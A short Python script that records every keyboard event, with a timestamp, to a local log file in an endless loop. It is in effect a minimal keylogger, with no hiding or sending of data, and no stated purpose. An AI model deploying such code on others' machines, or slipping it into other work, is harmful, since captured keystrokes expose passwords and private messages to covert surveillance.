import keyboard,datetime
name = '_'.join(str(datetime.datetime.now()).split())
name = '.'.join(name.split(':'))
with open('$history/'+name,'w') as fo:
    while True:
        e = keyboard.read_event()
        fo.write('{0} - {1} - {2}\n'.format(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),e.event_type[0],e.name))
        fo.flush()